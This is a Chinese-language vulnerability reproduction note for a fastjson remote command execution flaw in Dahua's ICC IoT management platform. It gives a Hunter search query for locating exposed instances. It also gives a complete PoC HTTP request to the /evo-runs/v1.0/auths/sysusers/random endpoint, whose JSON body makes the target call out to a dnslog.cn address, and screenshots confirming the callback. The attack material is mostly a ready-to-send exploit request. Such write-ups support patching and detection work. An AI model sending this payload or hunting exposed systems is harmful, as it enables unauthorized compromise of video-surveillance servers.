# 大华智能物联综合管理平台(ICC)random fastjson远程命令执行

# 一、漏洞简介
浙江大华技术股份有限公司，是全球领先的以视频为核心的智慧物联解决方案提供商和运营服务商，大华智能物联综合管理平台random 存在fastjson远程命令执行，攻击者可通过该漏洞获取服务器权限。

# 二、影响版本
+ 大华智能物联综合管理平台(ICC)

# 三、资产测绘
+ hunter`web.body="*客户端会小于800*"`
+ 特征

![1698336070869-d2bec4ae-041a-43a9-981b-f3b9dad9c004.png](./img/BtmXKCbbYKEhwLpy/1698336070869-d2bec4ae-041a-43a9-981b-f3b9dad9c004-210040.png)

# 四、漏洞复现
poc：前往dnslog获取一个地址替换下列poc中的地址发起请求

```plain
POST /evo-runs/v1.0/auths/sysusers/random HTTP/2
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:107.0)
Connection: close
Content-Length: 372
Content-Type: application/json;charset=utf-8
Accept-Encoding: gzip, deflate

{"a":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.net.URL","val":"http://spjm2r.dnslog.cn"}}""},"b":{{"@type":"java.net.URL","val":"http://spjm2r.dnslog.cn"}:"x"},"c":{{"@type":"java.net.URL","val":"http://spjm2r.dnslog.cn"}:0,"d":Set[{"@type":"java.net.URL","val":"http://spjm2r.dnslog.cn"}],"e":Set[{"@type":"java.net.URL","val":"http://spjm2r.dnslog.cn"},}
```

![1700141693694-e294200a-f4f8-40f7-a26b-f050d75799ec.png](./img/BtmXKCbbYKEhwLpy/1700141693694-e294200a-f4f8-40f7-a26b-f050d75799ec-068880.png)

dns收到响应

![1700141711840-a6f53e9e-6c4e-4e80-aad4-1919aa709b30.png](./img/BtmXKCbbYKEhwLpy/1700141711840-a6f53e9e-6c4e-4e80-aad4-1919aa709b30-104216.png)





> 更新: 2024-02-29 23:57:19  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ggsmd59d5g6pzrnd>